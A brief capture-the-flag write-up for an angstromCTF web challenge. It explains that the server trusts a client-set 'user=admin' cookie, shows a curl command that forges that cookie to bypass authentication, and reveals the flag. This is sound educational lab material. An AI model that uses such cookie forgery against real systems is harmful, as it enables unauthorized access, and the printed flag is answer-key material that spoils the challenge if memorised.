#### Challenge:

Clam was doing his angstromCTF flag% speedrun when he ran into [the infamous timesink](https://auth-skip.web.actf.co) known in the speedrunning community as "auth". Can you pull off the legendary auth skip and get the flag?

[Source](./index.js ":ignore")

---

#### Solution:

The server checks the value of cookie user and if the value is equal to admin it returns the flag value. We set the cookie value using curl.

```bash
curl -v --cookie "user=admin" https://auth-skip.web.actf.co/ 
```

---

<details><summary>FLAG:</summary>

```
actf{passwordless_authentication_is_the_new_hip_thing}
```

</details>
<br/>
